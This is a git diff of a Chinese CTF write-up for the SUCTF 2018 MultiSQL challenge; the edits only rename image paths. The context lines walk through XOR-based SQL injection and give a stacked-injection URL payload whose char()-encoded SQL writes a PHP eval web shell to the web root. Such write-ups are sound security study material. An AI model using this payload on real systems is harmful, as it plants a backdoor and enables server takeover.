@@ -12,21 +12,21 @@
 
 首页没有找到利用的东西
 
-![](./img/[SUCTF 2018]MultiSQL-1.png)
+![](./img/[SUCTF2018]MultiSQL-1.png)
 
 查看源代码，发现了`注册`和`登录`
 
-![](./img/[SUCTF 2018]MultiSQL-2.png)
+![](./img/[SUCTF2018]MultiSQL-2.png)
 
 简单注册登录后发现`url中有id参数`，尝试异或是否能正常执行，正常界面如下
 
-![](./img/[SUCTF 2018]MultiSQL-3.png)
+![](./img/[SUCTF2018]MultiSQL-3.png)
 
 `0^6`返回`id=6`的界面,`6^6`返回`id=0`的界面
 
-![](./img/[SUCTF 2018]MultiSQL-4.png)
+![](./img/[SUCTF2018]MultiSQL-4.png)
 
-![](./img/[SUCTF 2018]MultiSQL-5.png)
+![](./img/[SUCTF2018]MultiSQL-5.png)
 
 尝试异或注入，使用代码判断数据库长度
 
@@ -54,7 +54,7 @@ if __name__ == '__main__':
     judge_database(db_length)
 ```
 
-![](./img/[SUCTF 2018]MultiSQL-6.png)
+![](./img/[SUCTF2018]MultiSQL-6.png)
 
 发现可以注入数据库，但是后面似乎过滤了`substrd`等，尝试堆叠注入直接写入文件
 
@@ -81,6 +81,6 @@ sql_to_char(sql_statement)
 ?id=2;set+@sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,49,46,112,104,112,39,59);prepare+query+from+@sql;execute+query;
 ```
 
-![](./img/[SUCTF 2018]MultiSQL-7.png)
+![](./img/[SUCTF2018]MultiSQL-7.png)
 
-![](./img/[SUCTF 2018]MultiSQL-8.png)
+![](./img/[SUCTF2018]MultiSQL-8.png)
